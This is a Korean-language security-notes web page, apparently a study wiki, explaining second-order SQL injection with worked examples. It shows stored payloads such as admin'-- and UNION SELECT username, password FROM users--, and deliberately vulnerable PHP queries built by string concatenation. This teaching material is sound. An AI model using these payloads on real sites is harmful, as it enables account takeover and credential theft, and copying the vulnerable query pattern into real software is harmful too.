<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-web_attacks/sql_injection/second_order" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">Second-Order SQL Injection | 남키 노트</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://naaamgi.github.io/my-docusaurus-page/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://naaamgi.github.io/my-docusaurus-page/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/second_order/"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Second-Order SQL Injection | 남키 노트"><meta data-rh="true" name="description" content="저장 후 나중에 실행되는 지연된 SQL Injection 공격"><meta data-rh="true" property="og:description" content="저장 후 나중에 실행되는 지연된 SQL Injection 공격"><meta data-rh="true" name="keywords" content="second-order sqli,stored sqli,delayed injection,sql injection"><link data-rh="true" rel="icon" href="/my-docusaurus-page/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/second_order/"><link data-rh="true" rel="alternate" href="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/second_order/" hreflang="en"><link data-rh="true" rel="alternate" href="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/second_order/" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://IKHBXIBECM-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Web Attacks","item":"https://naaamgi.github.io/my-docusaurus-page/category/web-attacks-1"},{"@type":"ListItem","position":2,"name":"SQL Injection","item":"https://naaamgi.github.io/my-docusaurus-page/category/sql-injection"},{"@type":"ListItem","position":3,"name":"Second-Order SQL Injection","item":"https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/second_order"}]}</script><link rel="search" type="application/opensearchdescription+xml" title="남키 노트" href="/my-docusaurus-page/opensearch.xml">

<meta name="google-site-verification" content="TkKso4Rp4FBa7WmPeJolw4p7PHEmAgbaEN58vXpDT7s">
<meta name="algolia-site-verification" content="86D382FE0A8B0915"><link rel="stylesheet" href="/my-docusaurus-page/assets/css/styles.493a5fa7.css">
<script src="/my-docusaurus-page/assets/js/runtime~main.99566b0f.js" defer="defer"></script>
<script src="/my-docusaurus-page/assets/js/main.b02e072e.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/my-docusaurus-page/img/apple-touch-icon.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/my-docusaurus-page/"><div class="navbar__logo"><img src="/my-docusaurus-page/img/apple-touch-icon.png" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/my-docusaurus-page/img/apple-touch-icon.png" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">남키 노트</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/my-docusaurus-page/">docs</a><a href="https://naaamgi.github.io/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Go to Blog<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/my-docusaurus-page/"><span title="소개 (Intro)" class="linkLabel_WmDU">소개 (Intro)</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/cheatsheet/"><span title="Cheatsheet" class="categoryLinkLabel_W154">Cheatsheet</span></a><button aria-label="Expand sidebar category &#x27;Cheatsheet&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/category/penetration-testing/"><span title="Penetration Testing" class="categoryLinkLabel_W154">Penetration Testing</span></a><button aria-label="Expand sidebar category &#x27;Penetration Testing&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/category/security-tools/"><span title="Security Tools" class="categoryLinkLabel_W154">Security Tools</span></a><button aria-label="Expand sidebar category &#x27;Security Tools&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/my-docusaurus-page/category/web-attacks-1/"><span title="Web Attacks" class="categoryLinkLabel_W154">Web Attacks</span></a><button aria-label="Collapse sidebar category &#x27;Web Attacks&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/my-docusaurus-page/category/sql-injection/"><span title="SQL Injection" class="categoryLinkLabel_W154">SQL Injection</span></a><button aria-label="Collapse sidebar category &#x27;SQL Injection&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/sql_injection_기초/"><span title="SQL Injection 기초" class="linkLabel_WmDU">SQL Injection 기초</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/in_band_sqli/"><span title="In-band SQL Injection" class="linkLabel_WmDU">In-band SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/error_based/"><span title="Error-based SQL Injection" class="linkLabel_WmDU">Error-based SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/union_based/"><span title="Union-based SQL Injection" class="linkLabel_WmDU">Union-based SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/blind_sqli/"><span title="Blind SQL Injection 개요" class="linkLabel_WmDU">Blind SQL Injection 개요</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/boolean_based/"><span title="Boolean-based Blind SQL Injection" class="linkLabel_WmDU">Boolean-based Blind SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/time_based/"><span title="Time-based Blind SQL Injection" class="linkLabel_WmDU">Time-based Blind SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/out_of_band/"><span title="Out-of-Band SQL Injection" class="linkLabel_WmDU">Out-of-Band SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/stacked_queries/"><span title="Stacked Queries SQL Injection" class="linkLabel_WmDU">Stacked Queries SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/second_order/"><span title="Second-Order SQL Injection" class="linkLabel_WmDU">Second-Order SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/waf_bypass/"><span title="WAF 우회 기법 (WAF Bypass)" class="linkLabel_WmDU">WAF 우회 기법 (WAF Bypass)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/database_specific/"><span title="DBMS별 특화 기법" class="linkLabel_WmDU">DBMS별 특화 기법</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/rooted_based/"><span title="Rooted-based SQL Injection" class="linkLabel_WmDU">Rooted-based SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/nosql_injection/"><span title="NoSQL Injection" class="linkLabel_WmDU">NoSQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/advanced_exploitation/"><span title="고급 익스플로잇 (Advanced Exploitation)" class="linkLabel_WmDU">고급 익스플로잇 (Advanced Exploitation)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/sqlmap_가이드/"><span title="SQLMap 완벽 가이드" class="linkLabel_WmDU">SQLMap 완벽 가이드</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/ghauri/"><span title="Ghauri - 차세대 SQL Injection 도구" class="linkLabel_WmDU">Ghauri - 차세대 SQL Injection 도구</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/sqliv/"><span title="SQLiv - 대량 SQL Injection 스캐너" class="linkLabel_WmDU">SQLiv - 대량 SQL Injection 스캐너</span></a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/category/sk-rookies/"><span title="SK Rookies" class="categoryLinkLabel_W154">SK Rookies</span></a><button aria-label="Expand sidebar category &#x27;SK Rookies&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/my-docusaurus-page/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/my-docusaurus-page/category/web-attacks-1/"><span>Web Attacks</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/my-docusaurus-page/category/sql-injection/"><span>SQL Injection</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Second-Order SQL Injection</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Second-Order SQL Injection</h1></header>
<blockquote>
<p>Second-Order SQLi는 악의적인 페이로드가 즉시 실행되지 않고 데이터베이스에 저장된 후, 나중에 다른 기능에서 사용될 때 실행되는 고급 공격 기법입니다.</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="개념-concept">개념 (Concept)<a href="#개념-concept" class="hash-link" aria-label="Direct link to 개념 (Concept)" title="Direct link to 개념 (Concept)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="second-order-sqli란">Second-Order SQLi란?<a href="#second-order-sqli란" class="hash-link" aria-label="Direct link to Second-Order SQLi란?" title="Direct link to Second-Order SQLi란?" translate="no">​</a></h3>
<p>**Second-Order SQL Injection (2차 SQL Injection)**은 공격이 <strong>두 단계</strong>로 나누어 실행됩니다:</p>
<p><strong>1단계 (Injection)</strong>: 악의적 SQL 페이로드를 데이터베이스에 <strong>저장</strong>
<strong>2단계 (Execution)</strong>: 저장된 데이터가 다른 쿼리에서 사용되어 <strong>실행</strong></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="일반-sqli-vs-second-order-sqli">일반 SQLi vs Second-Order SQLi<a href="#일반-sqli-vs-second-order-sqli" class="hash-link" aria-label="Direct link to 일반 SQLi vs Second-Order SQLi" title="Direct link to 일반 SQLi vs Second-Order SQLi" translate="no">​</a></h3>
<table><thead><tr><th>구분</th><th>First-Order SQLi</th><th>Second-Order SQLi</th></tr></thead><tbody><tr><td><strong>실행 시점</strong></td><td>즉시 실행</td><td>지연 실행 (나중에)</td></tr><tr><td><strong>저장 여부</strong></td><td>저장 안 됨</td><td>DB에 저장됨</td></tr><tr><td><strong>탐지 난이도</strong></td><td>쉬움</td><td>어려움</td></tr><tr><td><strong>공격 단계</strong></td><td>1단계 (입력 → 실행)</td><td>2단계 (저장 → 실행)</td></tr><tr><td><strong>방어 우회</strong></td><td>입력 검증</td><td>입력 검증 통과 가능</td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="작동-원리">작동 원리<a href="#작동-원리" class="hash-link" aria-label="Direct link to 작동 원리" title="Direct link to 작동 원리" translate="no">​</a></h3>
<p><strong>예시 시나리오</strong>: 사용자 프로필 수정 기능</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="1단계-페이로드-저장-안전하게-저장됨">1단계: 페이로드 저장 (안전하게 저장됨)<a href="#1단계-페이로드-저장-안전하게-저장됨" class="hash-link" aria-label="Direct link to 1단계: 페이로드 저장 (안전하게 저장됨)" title="Direct link to 1단계: 페이로드 저장 (안전하게 저장됨)" translate="no">​</a></h4>
<p><strong>회원가입 페이로드</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password: password123</span><br></span></code></pre></div></div>
<p><strong>실행되는 INSERT 쿼리</strong> (Prepared Statement 사용):</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">INTO</span><span class="token plain"> users </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">VALUES</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">?</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ?</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>→ <code>admin&#x27;--</code> 문자열이 <strong>그대로 저장</strong> (SQLi 실행 안 됨)</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="2단계-페이로드-실행-취약한-기능에서">2단계: 페이로드 실행 (취약한 기능에서)<a href="#2단계-페이로드-실행-취약한-기능에서" class="hash-link" aria-label="Direct link to 2단계: 페이로드 실행 (취약한 기능에서)" title="Direct link to 2단계: 페이로드 실행 (취약한 기능에서)" translate="no">​</a></h4>
<p><strong>비밀번호 변경 기능</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$username = $_SESSION[&#x27;username&#x27;];  // &quot;admin&#x27;--&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$new_password = $_POST[&#x27;new_password&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 취약한 쿼리 (문자열 연결)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;UPDATE users SET password=&#x27;$new_password&#x27; WHERE username=&#x27;$username&#x27;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysqli_query($conn, $query);</span><br></span></code></pre></div></div>
<p><strong>생성되는 쿼리</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> password</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;hacked&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--&#x27;</span><br></span></code></pre></div></div>
<p><strong>실행 결과</strong>:</p>
<ul>
<li><code>--</code> 주석으로 뒤의 <code>&#x27;</code> 무시</li>
<li>실제로 실행되는 쿼리:<!-- -->
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> password</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;hacked&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><br></span></code></pre></div></div>
</li>
<li><strong>모든 admin 계정의 비밀번호 변경</strong></li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="발생-패턴">발생 패턴<a href="#발생-패턴" class="hash-link" aria-label="Direct link to 발생 패턴" title="Direct link to 발생 패턴" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-회원가입--프로필-수정">1. 회원가입 → 프로필 수정<a href="#1-회원가입--프로필-수정" class="hash-link" aria-label="Direct link to 1. 회원가입 → 프로필 수정" title="Direct link to 1. 회원가입 → 프로필 수정" translate="no">​</a></h3>
<p><strong>1단계: 회원가입</strong> (페이로드 저장):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: hacker&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Email: hacker@example.com</span><br></span></code></pre></div></div>
<p><strong>2단계: 프로필 수정</strong> (페이로드 실행):</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$username = $_SESSION[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$bio = $_POST[&#x27;bio&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 취약한 쿼리</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;UPDATE profiles SET bio=&#x27;$bio&#x27; WHERE username=&#x27;$username&#x27;&quot;;</span><br></span></code></pre></div></div>
<p><strong>결과</strong>: 모든 사용자의 프로필이 수정됨</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-게시글-작성--검색">2. 게시글 작성 → 검색<a href="#2-게시글-작성--검색" class="hash-link" aria-label="Direct link to 2. 게시글 작성 → 검색" title="Direct link to 2. 게시글 작성 → 검색" translate="no">​</a></h3>
<p><strong>1단계: 게시글 작성</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Title: Normal Title</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content: &#x27; UNION SELECT username, password FROM users--</span><br></span></code></pre></div></div>
